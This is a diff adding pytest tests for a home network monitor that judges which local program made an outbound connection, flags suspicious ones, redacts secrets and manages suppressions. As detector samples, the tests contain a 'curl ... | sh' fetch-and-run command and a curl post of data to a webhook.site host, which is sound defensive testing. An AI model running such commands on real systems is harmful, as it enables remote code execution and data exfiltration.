@@ -3,6 +3,7 @@
 import json
 from datetime import datetime, timezone
 
+import pytest
 from conftest import T0
 
 from tapwatch.hostctx import HostContext, Owner, OwnerIndex, transcript_facts, verdict
@@ -98,7 +99,8 @@ def test_owner_asked_for_it(tmp_path):
                                     tool_result(T0 - 230)])
     f = transcript_facts(p, {"webhook.site", "abc.webhook.site"}, T0)
     assert f == {"transcript": True, "agent_named_dest": True, "agent_busy": False, "minutes_since_prompt": 1,
-                 "owner_named_dest": True, "outside_content": False}
+                 "owner_named_dest": True, "outside_content": False,
+                 "agent_command": "curl -d x https://abc.webhook.site/1"}
 
 
 def test_injection_pattern_web_content_then_action(tmp_path):
@@ -282,3 +284,102 @@ def test_without_osquery_a_transcript_match_is_reported_but_never_lowers_the_cas
     assert facts["host_who"] == "unknown" and not facts["host_corroborated"]
     c = hc_case(**facts)
     assert "ran a command naming this destination, and the owner's message named it" in summarize(c, Assets())
+
+
+# ------------------------------------------------- what ran on the PC: assessment and explain
+
+from tapwatch.hostctx import assess, redact
+
+
+def test_redact_masks_secret_looking_parts():
+    r = redact("curl -H 'Authorization: Bearer abcdefabcdefabcdefabcdefabcdefabcdef' https://x.example?token=s3cret")
+    assert "abcdefabcdef" not in r and "s3cret" not in r and "https://x.example" in r
+
+
+def test_assess_suspicious_signs():
+    tmp = Owner(name="upd", path="/tmp/.x/upd")
+    gone = Owner(name="svc", path="/usr/bin/svc", on_disk="0")
+    pipe = Owner(name="bash", path="/usr/bin/bash", cmdline="bash -c curl -s https://x.example/i | sh")
+    for o in (tmp, gone, pipe):
+        assessment, signals = assess([o], "other_program")
+        assert assessment == "suspicious" and signals
+
+
+def test_assess_installed_programs_and_agents():
+    assert assess([Owner(name="Spotify", path="/usr/share/spotify/spotify")], "other_program")[0] == "likely_benign"
+    assert assess([Owner(name="claude", path="/home/u/.local/share/claude/versions/2.1")], "other_program")[0] == \
+        "likely_benign"
+    assert assess([Owner(name="x", path="/home/u/Downloads/x")], "other_program")[0] == "unclear"
+    curl = Owner(name="curl", path="/usr/bin/curl", session=SID, attended="1", entrypoint="cli")
+    assert assess([curl], "owner_using_agent")[0] == "likely_benign"
+    assert assess([curl], "agent_unconfirmed")[0] == "unclear"
+    assert assess([curl], "agent_misused")[0] == "suspicious"
+    assert assess([], "unknown")[0] == "unclear"
+
+
+def test_collect_sets_floors_and_caps_from_the_assessment(tmp_path):
+    hc = HostContext(PC, "osqueryi", [], str(tmp_path),
+                     runner=FakeRunner([dict(socket_row(name="upd", session=""), path="/tmp/upd")]))
+    bad = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0)
+    assert bad["host_assessment"] == "suspicious" and bad["min_route"] == "alert"
+    hc = HostContext(PC, "osqueryi", [], str(tmp_path),
+                     runner=FakeRunner([dict(socket_row(name="spotify", session=""), path="/usr/share/spotify/spotify")]))
+    ok = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0)
+    assert ok["host_assessment"] == "likely_benign" and ok["host_max_route"] == "digest"
+    assert ok["host_program_path"] == "/usr/share/spotify/spotify"
+
+
+def test_router_suspicious_floor_beats_suppression_and_host_cap_never_loosens():
+    c = case(detector="beaconing", facts={"interval_s": 60, "count": 40, "span_s": 2400, "regularity": "very regular",
+                                          "port": 443, "service": "ssl", "min_route": "alert",
+                                          "host_signals": ["upd runs from a temporary folder"]})
+    r, reason = route(c, None, suppression="beaconing (main PC, x)")
+    assert r is Route.ALERT and "temporary folder" in reason
+    c2 = case(detector="beaconing", facts={"interval_s": 60, "count": 40, "span_s": 2400, "regularity": "very regular",
+                                           "port": 443, "service": "ssl", "max_route": "log", "host_max_route": "digest"},
+              base_severity=4)
+    assert route(c2, None)[0] is Route.LOG                     # the stricter detector cap wins
+
+
+def test_device_program_suppression(tmp_path):
+    from tapwatch.store import Store, WorkflowError
+    s = Store(str(tmp_path / "t.db"))
+    facts = {"port": 443, "host_program_path": "/usr/bin/spotify", "host_assessment": "likely_benign"}
+    c = case(detector="beaconing", facts=facts, indicators=["spclient.example"])
+    cid = s.add(c, "state", None, Route.DIGEST, "r")
+    s.add_suppression(cid, "device_program", "Spotify keepalive", "test")
+    assert s.match_suppression(case(detector="beaconing", facts=dict(facts), indicators=["other.example"]))
+    other = dict(facts, host_program_path="/tmp/evil")
+    assert s.match_suppression(case(detector="beaconing", facts=other, indicators=["spclient.example"])) is None
+    no_prog = s.add(case(detector="beaconing", facts={"port": 443}, indicators=["a.example"]), "s", None, Route.DIGEST, "r")
+    with pytest.raises(WorkflowError):
+        s.add_suppression(no_prog, "device_program", "x", "test")
+
+
+def test_explain_suggests_only_repeated_all_benign_groups_and_applies(tmp_path):
+    from tapwatch import explain
+    from tapwatch.store import Store
+    s = Store(str(tmp_path / "t.db"))
+    def add(assessment, program="/usr/bin/battle", ind="version.battle.example", ts=T0):
+        f = {"port": 443, "host_assessment": assessment, "host_program_path": program,
+             "host_signals": ["battle is an installed program (/usr/bin)"], "host_parent": "systemd", "dedupe": ind}
+        return s.add(case(detector="beaconing", ts=ts, facts=f, indicators=[ind]), "st", None, Route.DIGEST, "r")
+    ids = [add("likely_benign", ts=T0 + i * 86400) for i in range(3)]
+    add("likely_benign", program="/usr/bin/other", ind="other.example")          # only 1 case: not enough
+    add("unclear", program="/usr/bin/x", ind="x.example"); add("likely_benign", program="/usr/bin/x", ind="x.example")
+    add("likely_benign", program="/usr/bin/x", ind="x.example")                   # one unclear case: no suggestion
+    gs = explain.groups(s, since=0)
+    sugg = [g for g in gs if g["explained"] and g["cases"] >= 3]
+    assert len(sugg) == 1 and sugg[0]["program"] == "/usr/bin/battle" and sorted(sugg[0]["open"]) == ids
+    assert "3 cases over 2 day(s)" in explain.reason(sugg[0])
+    _, closed = explain.apply(s, sugg[0])
+    assert sorted(closed) == ids
+    row = s.get(ids[0])
+    assert row["status"] == "closed" and row["disposition"] == "benign_expected"
+    assert s.suppressions()[0]["scope"] == "device_program"
+
+
+def test_summary_never_contains_the_command_line():
+    c = hc_case(host_assessment="likely_benign", host_cmdline="curl --secret-thing https://x", host_agent_command="curl x")
+    text = summarize(c, Assets())
+    assert "found nothing suspicious" in text and "secret-thing" not in text and "curl x" not in text
